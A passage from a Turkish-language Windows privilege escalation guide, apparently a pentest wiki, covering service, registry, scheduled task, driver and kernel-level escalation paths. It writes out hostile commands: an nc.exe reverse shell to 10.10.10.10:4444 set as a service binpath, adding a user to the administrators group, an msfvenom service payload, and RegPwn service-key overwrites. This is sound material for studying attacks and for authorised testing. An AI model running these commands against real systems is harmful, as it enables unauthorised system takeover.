accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

"Authenticated Users" grubunun herhangi bir hizmeti değiştirip değiştiremediğini kontrol etmeniz önerilir:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; çünkü devre dışı veya etkinleştirilmiş cihazlarla ilişkilendirilmemiş._

Şunu kullanarak etkinleştirebilirsiniz:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**upnphost hizmetinin çalışması için SSDPSRV'ye bağlı olduğunu dikkate alın (XP SP1 için)**

**Bu soruna yönelik başka bir geçici çözüm** şunu çalıştırmaktır:

```
sc.exe config usosvc start= auto
```

### **Servis ikili dosya yolunu değiştirme**

"Kimliği doğrulanmış kullanıcılar" grubunun bir hizmet üzerinde **SERVICE_ALL_ACCESS** sahibi olduğu senaryoda, hizmetin yürütülebilir ikili dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve yürütmek için:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Hizmeti yeniden başlat

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Ayrıcalıklar çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Servis binary dosyasının yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve servis yapılandırmalarını değiştirme olanağı sunar.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına olanak tanır.
- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Servis yapılandırmalarını değiştirme yeteneğini de devralır.

Bu güvenlik açığının tespiti ve istismarı için _exploit/windows/local/service_permissions_ kullanılabilir.

### Servis binary dosyalarının zayıf izinleri

Bir servis **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir domain hesabı olarak çalışıyorsa ve **düşük ayrıcalıklı kullanıcılar servis EXE dosyasını ya da üst klasörünü değiştirebiliyorsa**, servis çoğu zaman **binary dosyası değiştirilip servis yeniden başlatılarak** ele geçirilebilir.

**Bir servis tarafından çalıştırılan binary dosyasını değiştirebiliyor musunuz** veya binary dosyasının bulunduğu **klasör üzerinde yazma izinleriniz var mı kontrol edin** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir servis tarafından çalıştırılan tüm binary dosyalarını **wmic** (system32 içinde değil) kullanarak listeleyebilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Ayrıca **sc** ve **icacls** kullanabilirsiniz:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** gruplarına verilmiş, özellikle hizmet yürütülebilir dosyası ya da bu dosyayı içeren dizin üzerinde **`(F)`**, **`(M)`** veya **`(W)`** izinleri gibi tehlikeli ACL’leri arayın. Uygulanabilir bir kötüye kullanım akışı:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` ile hizmet hesabını ve yürütülebilir dosya yolunu doğrulayın.
2. `icacls <path>` ile binary dosyasının yazılabilir olduğunu doğrulayın.
3. Hizmet binary dosyasını bir payload veya geçerli bir kötü amaçlı hizmet binary dosyasıyla değiştirin.
4. `sc stop <service_name> && sc start <service_name>` ile hizmeti yeniden başlatın (veya yeniden başlatmayı / hizmet tetikleyicisini bekleyin).

Yararlı otomatik kontroller:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Hizmet, normal bir kullanıcının onu yeniden başlatmasına izin vermiyorsa, açılışta otomatik olarak başlayıp başlamadığını, hata durumunda yeniden başlatılmasını sağlayan bir eylemi olup olmadığını veya onu kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemeyeceğini kontrol edin.

### Hizmet kayıt defterini değiştirme izinleri

Herhangi bir hizmet kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet **kayıt defteri** üzerindeki **izinlerinizi** şu şekilde **kontrol edebilirsiniz**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Orijinal izin testi şu şekilde ifade edilmişti:

**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** kullanıcılarının `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Sahiplerse, service tarafından çalıştırılan binary değiştirilebilir.

**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** kullanıcılarının belirli bir service anahtarında yazma yetkisi veren registry izinlerine sahip olup olmadığını inceleyin. Tek başına bir ACL girdisi, etkin erişimi kanıtlamaz: deny girdileri, geçerli token ve devralınan izinler önemlidir. Registry anahtarı hakları, service nesnesinin `SERVICE_CHANGE_CONFIG` ve `SERVICE_START` haklarından ayrıdır. Privilege escalation için ayrıca kullanılabilir bir service configuration alanı, service'i tetikleme yolu ve daha ayrıcalıklı bir service identity gerekir. Microsoft'un [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) ve [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) sayfalarına bakın.

Çalıştırılan binary'nin Path değerini değiştirmek için:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race ile rastgele HKLM değer yazma (ATConfig)

Bazı Windows Erişilebilirlik özellikleri, daha sonra bir **SYSTEM** işlemi tarafından HKLM oturum anahtarına kopyalanan kullanıcı başına **ATConfig** anahtarları oluşturur. Bir registry **symbolic link race**, bu ayrıcalıklı yazmayı **herhangi bir HKLM yoluna** yönlendirerek rastgele HKLM **değer yazma** olanağı sağlar.<sup>[[18]](#references)</sup>

Anahtar konumları (örnek: Ekran Klavyesi `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü erişilebilirlik özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı denetimindeki yapılandırmayı saklar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, oturum açma/güvenli masaüstü geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Kötüye kullanma akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** değerini ayarlayın.
2. Güvenli masaüstü kopyalama işlemini tetikleyin (ör. **LockWorkstation**); bu, AT broker akışını başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerinde bir **oplock** ayarlayarak **yarışta kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını korumalı bir HKLM hedefine işaret eden bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilen HKLM yoluna yazar.

Rastgele HKLM değer yazma olanağını elde ettikten sonra, hizmet yapılandırma değerlerinin üzerine yazarak LPE'ye geçiş yapın:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komut satırı)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir hizmet seçin (ör. **`msiserver`**) ve yazma işleminden sonra hizmeti tetikleyin. **Not:** Genel exploit uygulaması, yarışın bir parçası olarak iş istasyonunu kilitler.

Örnek araçlar (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory izinleri

Bir registry üzerinde bu izne sahipseniz, **bu registry altında alt registry'ler oluşturabilirsiniz**. Windows hizmetleri söz konusu olduğunda bu, **keyfi kod çalıştırmak için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Tırnaksız Hizmet Yolları

Bir çalıştırılabilir dosyanın yolu tırnak içinde değilse, Windows boşlukla biten her ifadeyi çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları çalıştırmayı dener:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listeleyin:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bu güvenlik açığını** metasploit ile tespit edip istismar edebilirsiniz: `exploit/windows/local/trusted\_service\_path` Metasploit ile manuel olarak bir servis binary dosyası oluşturabilirsiniz:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Kurtarma Eylemleri

Windows, kullanıcıların bir hizmet başarısız olduğunda gerçekleştirilecek eylemleri belirtmesine olanak tanır. Bu özellik bir binary'yi işaret edecek şekilde yapılandırılabilir. Bu binary değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla ayrıntı [resmi belgelerde](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bulunabilir.

## Zamanlanmış görev betiği hedefleri

`.bat` veya `.cmd` dosyasıyla `cmd.exe /c` çalıştıran etkin bir görev için, `cmd.exe`'nin yanı sıra **eylem bağımsız değişkenlerinde** adı geçen betiği de kontrol edin. Aynı durum, PowerShell `-File` gibi yorumlayıcılara açıkça belirtilen dosya bağımsız değişkenleri için de geçerlidir. Zamanlanmış bir batch dosyası doğrudan bir PowerShell `-File` çağrısı içeriyorsa, başvurulan betiğin ACL'sini de inceleyin; değişkenler, koşullu ifadeler ve shell zincirleme işlemleri elle izlenmelidir. Çağıran hesabın yazabildiği bir betik veya üst dizin, yalnızca yapılandırılmış görev sorumlusu çağıran hesaptan farklıysa ve görev gerçekten bu eyleme ulaşıyorsa hesaplar arası yürütme için bir ipucudur. Betikler için yalnızca sona ekleme izni olan bir ACL önemli olabilir; ancak önceki bir `exit` veya başka bir kontrol akışı, eklenen satırların erişilemez olmasına neden olabilir. Privilege escalation iddiasında bulunmadan önce etkin ACL'leri, [görev yürütme bağlamını](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), çalışma dizinini, tetikleyiciyi ve uygulama denetimi ilkesini doğrulayın. Envanter çıkarma işlemi betiği değiştirmemeli veya görevi başlatmamalıdır.

## Erişilebilir dosyalardaki adlandırılmış akışlar

NTFS'de okunabilir bir dosyanın, sıradan bir dizin listelemesinde görünmeyen içeriklere sahip adlandırılmış bir `:$DATA` akışı olabilir. Erişilebilir yedekleme veya yapılandırma dosyalarından küçük ve ilgili bir küme için, içerikleri açmadan önce akış **adlarını ve boyutlarını** inceleyin; Windows bunları [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) ve PowerShell'in [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) komutlarıyla sunar. Bir sırrı çağrıştıran akış adı yalnızca bir ipucudur. Dosyanın etkin okuma erişimini, dosya sisteminin akış desteğini, akışın kullanılabilir kimlik bilgileri içerip içermediğini ve bu kimlik bilgilerinin gerçekte hangi hesapla kimlik doğruladığını kontrol edin. Rutin envanter çıkarma sırasında özyinelemeli akış taramalarından ve akış içeriklerini yazdırmaktan kaçının.

## Zamanlanmış Windows Driver Kit yardımcı programı girdileri

İsteğe bağlı Windows Driver Kit, çalıştırıldığı dizindeki `command.txt`, `reboot.rsf` ve proje `working\rsf.rsf` dosyasını kullanabilen `StandaloneRunner.exe` dosyasını içerir. Ayrıcalıklı bir hesapla bu yardımcı programı başlatan zamanlanmış bir görev veya hizmet, yardımcı programın yürütülebilir dosyası korumalı olsa bile bu girdilere düşük ayrıcalıklı yazma erişimini söz konusu hesabın bağlamında komut yürütmeye dönüştürebilir. Ayrıcalıklı tüketiciyi ve **her iki** yan dosyanın oluşturulup değiştirilebildiğini doğrulayın; yalnızca yardımcı programı bulmak yeterli değildir.

Zamanlanmış bir görev için, eylemin [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ayarını ve iki yan dosya yolunun ACL'lerini inceleyin. Görev bir çalışma dizini belirtmiyorsa, yürütülebilir dosyanın dizini girdilerin nereden okunduğunu doğrulamak için bir ipucudur; kanıt değildir. Projenin çalışma dosyasına ilişkin önkoşul da karşılanmalıdır. Görevin SYSTEM olarak çalıştığını varsaymak yerine gerçek görev sorumlusunu kontrol edin.

## Uygulamalar

### Yüklü Uygulamalar

**Binary'lerin izinlerini** (birini üzerine yazıp privilege escalation sağlayabilirsiniz) ve **klasörlerin izinlerini** ([DLL Hijacking](dll-hijacking/index.html)) kontrol edin.

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent onarım yolu

[CVE-2024-0670](https://checkmk.com/werk/16361), `C:\Windows\Temp` konumunda komut dosyaları oluşturan ve değiştirme başarısız olduğunda önceden var olan, yazmaya karşı korumalı bir dosyayı çalıştıran eski Checkmk Windows agent sürümlerini etkiler. Üretici sorunu 2.1.0p40, 2.2.0p23, 2.3.0b1 ve 2.4.0b1 sürümlerinde düzeltti. Yüklü sürümün tam yama düzeyini ve etkilenen agent işleminin çalışıp çalışamayacağını kontrol edin; yalnızca `2.1` gibi bir dal etiketi, sistemin etkilenip etkilenmediğini belirleyemez. Enumeration, dosya oluşturmadan veya agent komutlarını tetiklemeden sürümü, hizmet durumunu ve Temp izinlerini inceleyebilir.

#### ADSelfService Plus SAML hizmeti incelemesi

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html), ADSelfService Plus'ın 6210 ve önceki build'lerini etkiledi; üretici bunu 6211 build'inde düzeltti. Bu sorun yalnızca SAML SSO etkinse veya geçmişte etkin olmuşsa önemlidir. Bu nedenle, kurulu ürün kaydı veya hizmet yolu bir ipucudur; tek başına güvenlik açığı olduğunu göstermez: kesin build'i, SAML yapılandırma geçmişini, hizmetin ağ üzerinden erişilebilirliğini ve çalıştığı hesabı doğrulayın. Hizmet üzerinden kod çalıştırma, o hesabın ayrıcalıklarını devralır; SYSTEM olarak çalıştırma için örneğin SYSTEM hesabıyla çalışıyor olması gerekir. Ürünün Backup dizininde okunabilir bir `OfflineBackup_*.ezip` bulunması, ayrı ve şifrelenmiş bir yedekleme ipucudur; kullanılabilir bir kimlik bilgisinin veya bu SAML açığının kanıtı değildir. Rutin enumeration sırasında dosyayı açmadan yolunu ve erişim haklarını kaydedin.

#### Jenkins controller ve domain hesabı sınırları

Windows Jenkins controller'ında, bir job oluşturma veya yapılandırma iznini onu başlatma izninden ayırın: [Jenkins bunları ayrı `Job/Create`, `Job/Configure` ve `Job/Build` hakları olarak belgeliyor](https://www.jenkins.io/doc/book/security/access-control/permissions/). Yapılandırılmış bir zamanlama veya uzaktan tetikleyici başka bir build yolu sağlayabilir; ancak bunun etkin olduğunu ve build'in gerçekten çalıştığını doğrulayın. Çalıştırma, controller'ın veya seçilen agent'ın kimliğiyle yapılır; kayıtlı bir kimlik bilgisi yalnızca job'ın kapsamına erişebiliyorsa kullanılabilir. Ayrıca `JENKINS_HOME` metadata'sına erişimi inceleyin: Jenkins, kimlik bilgisi malzemelerini ve şifreleme anahtarlarını `credentials.xml`, `secrets/hudson.util.Secret` ve `secrets/master.key` dosyalarında tutar ([Jenkins gizli bilgi depolama](https://www.jenkins.io/doc/developer/security/secrets/)). Bu dosyaların bulunması tek başına parolayı açığa çıkarmaz; paylaşılan çıktıda sırları yazdırmadan **gerekli dosyalara okuma erişimini** ve hesaba özgü ayrı bir yeniden kullanım yolunu doğrulayın. Bu hesabın AD kullanıcı nesnesinde `scriptPath` yazma hakkı varsa, bunu kullanıcılar arası çalıştırma olarak değerlendirmeden önce yazılabilir bir komut dosyası yolunu ve hedef kullanıcı olarak çalışan gerçek bir oturum açma veya zamanlanmış tüketiciyi doğrulayın. Ek grup denetimi için etkin AD hakları ayrıca doğrulanmalıdır.

#### Azure Pipelines self-hosted agent kimliği

Azure DevOps Server veya Azure Pipelines projesinde, bir pipeline **oluşturma veya düzenleme** iznini onu **kuyruğa alma** ve seçilen agent pool'u kullanma izninden ayırın; [Microsoft pipeline izinlerini](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) ve [pool yetkilendirmesini](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) ayrı ayrı belgeliyor. Daha düşük ayrıcalıklı bir hesap komut dosyası adımı gönderebiliyor ve bu pipeline'ı self-hosted Windows agent üzerinde çalıştırabiliyorsa, adım [agent için yapılandırılmış işletim sistemi hesabıyla](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) yürütülür. Kullanıcılar arası veya SYSTEM geçişi olduğunu öne sürmeden önce tam pipeline'ı, dal/kaynak kısıtlamalarını, yetkili pool'u, çalıştırılabilir job'ı ve agent hizmet kimliğini doğrulayın. Yüklü bir agent, proje rolü veya depoya yazma izni tek başına yalnızca bir ipucudur; pasif enumeration sırasında build başlatmadan izinleri ve yerel hizmet metadata'sını inceleyin.

#### Microsoft Entra Connect Sync kimlik bilgileri

[Microsoft,](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) eşitleme hizmetini çalıştıran ve SQL veritabanına erişen **ADSync hizmet hesabı** ile dizin izinleri yapılandırılmış eşitleme özelliklerine bağlı olan **AD DS connector hesabını** birbirinden ayırır. Connector kimlik bilgileri bu veritabanında şifrelenmiş olarak saklanır; anahtar malzemesi ise [ADSync hizmet hesabı altında DPAPI ile korunur](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Yüklü bir eşitleme hizmeti, yerel yönetici izlenimi veren bir grup veya veritabanının görünür olması tek başına çözülebilir bir kimlik bilgisini ya da domain ayrıcalığı yükseltmesini kanıtlamaz. Gerçek veritabanı okuma haklarını, hizmet hesabı/anahtar erişimini, kurulum ve SQL düzenini, yapılandırılmış connector kimliğini ve bu kimliğin etkin AD ayrıcalıklarını ayrı ayrı inceleyin. Rutin enumeration yalnızca hizmet ve erişim metadata'sını göstermeli; saklanan sırları sorgulamamalı veya yazdırmamalıdır.

#### Yazıcı sürücüsü destek DLL izinleri

Yüklü bir yazıcı sürücüsü, destek DLL'lerini `C:\ProgramData` altında tutabilir ve bunları daha ayrıcalıklı bir yazdırma işleminde yükleyebilir. Yazıcı WMI enumeration engellense bile üst dizinler ve reparse point'ler dâhil, sürücünün tam dizinini ve DLL ACL'lerini inceleyin. [Ricoh yazıcı sürücüsü sorunu CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) için bildirilen yol `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` idi; [ilk açıklama](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/), DLL'lerin `PrintIsolationHost.exe` tarafından yüklenmesini anlatıyor. Yazılabilir bir ACL yalnızca bir ipucudur: engelleme girişleri sonrasında geçerli yazma erişimini, ilgili sürücünün yüklü olduğunu ve dosyayı ayrıcalıklı bir kimlikle yüklediğini, ayrıca üreticinin güncel sürücüsünün veya güvenlik programının kurulumdaki sorunu giderip gidermediğini doğrulayın. Yalnızca dizin adına veya sürücü sürümüne bakarak güvenlik açığı olduğu sonucuna varmayın.

### Yazma İzinleri

Bir yapılandırma dosyasını değiştirerek özel bir dosyayı okuyup okuyamayacağınızı ya da bir Administrator hesabı tarafından çalıştırılacak bir binary'yi (`schedtasks`) değiştirip değiştiremeyeceğinizi kontrol edin.

Sistemdeki zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload kalıcılığı/çalıştırma

Notepad++ `plugins` alt klasörlerindeki tüm plugin DLL dosyalarını otomatik yükler. Yazılabilir bir portable/kopya kurulum varsa, kötü amaçlı bir plugin bırakmak her başlatmada `notepad++.exe` içinde otomatik kod çalıştırılmasını sağlar (`DllMain` ve plugin callback'leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Farklı bir kullanıcı tarafından çalıştırılacak bir registry veya binary dosyasının üzerine yazıp yazamayacağınızı kontrol edin.**\
**Yetkileri yükseltmek için ilgi çekici autoruns konumları** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı** **okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraflara ait şüpheli/açığı olan** sürücüleri arayın.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Bir driver keyfi kernel read/write primitive'i sunuyorsa (kötü tasarlanmış IOCTL handler'larında sık görülür), doğrudan kernel memory'den bir SYSTEM token çalarak yetki yükseltebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniği burada görebilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Windows kernel exploitation ile ilgili materyaller:

User tarafından yazılabilir read/write register'ları olan bir kernel-mode ring-buffer örneği için [USB MIDI looped-streaming variant](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming) bölümüne bakın.

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Açığa sahip çağrının saldırganın kontrolündeki bir Object Manager path'ini açtığı race-condition hatalarında, aramayı kasıtlı olarak yavaşlatmak (maksimum uzunlukta bileşenler veya derin directory zincirleri kullanarak) zaman aralığını mikrosaniyelerden onlarca mikrosaniyeye çıkarabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool bilgi sızıntıları ve I/O ring pivot'ları

Bazı Windows kernel LPE zincirleri, tek başlarına zayıf olan iki bug'dan oluşturulabilir: queue lock hâlâ tutulurken bir request/CBD'yi serbest bırakan **cancel-safe queue lifetime race** ve `RtlCopyToUser` sırasında serbest bırakılmış bir paged-pool allocation'dan veri sızdıran **kopyalama öncesi lock bırakma** açığı.<sup>[[29]](#references)</sup>

Denetim ve exploitation notları:

- **Kilit altında serbest bırakma + sonrasında iptal**: Başarı yolunun **Acquire -> CompleteRequest/free -> Release**, iptal yolunun ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı durumları arayın. Başarı yolu CBDQ/CSQ lock'unu bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` çağrısına ulaşırsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde engellenmiş bir thread daha sonra devam edip serbest bırakılmış bir `PFLT_CALLBACK_DATA`'yı driver'ın remove callback'ine aktarabilir.
- Serbest bırakılan queue object'ini aynı boyutta, saldırganın kontrolündeki bir paged-pool allocation ile **yeniden kullanıma alın**. `NPFS` Data Queue Entries kullanışlıdır; çünkü payload ve boyutu kontrol edilebilir, ayrıca sonradan pipe read/peek işlemleriyle incelenebilir. Serbest bırakılan object list link'leri içeriyorsa bunları **user memory'deki sahte request node'larından oluşan döngüsel bir listeyle** üzerine yazın; böylece driver, orijinal liste başında sonlanmak yerine saldırganın tanımladığı request structure'larını tekrar tekrar işler.
- **Öngörülebilir bir write'ı yükseltin**: Sahte request, bookkeeping write'larının kullandığı iç içe bir context pointer'ı (timestamps / QPC / refcount'a komşu alanlar) yönlendiriyorsa, **adresi kontrol edilebilen ancak değeri kontrol edilemeyen** bir kernel write elde edebilirsiniz. Bu durumda son bir code/data pointer'ı yerine spray edilmiş bir pool object'in **length/size** alanını hedefleyin, ardından bozulan object bir **sınır dışı paged-pool read** sağlayana kadar spray'i tarayın.
- **Race ile açığa çıkarılabilen veri örüntüsü**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan her syscall güçlü bir adaydır. Saldırgan kopyalanan buffer'ı büyütebiliyorsa (örneğin serializer'ın son allocation boyutunu artıran çok sayıda liste/resource girdisi ekleyerek) güvenilirlik artar; çünkü daha uzun kopyalama, sistemi çökertmeden değiştirme aralığını genişletir.
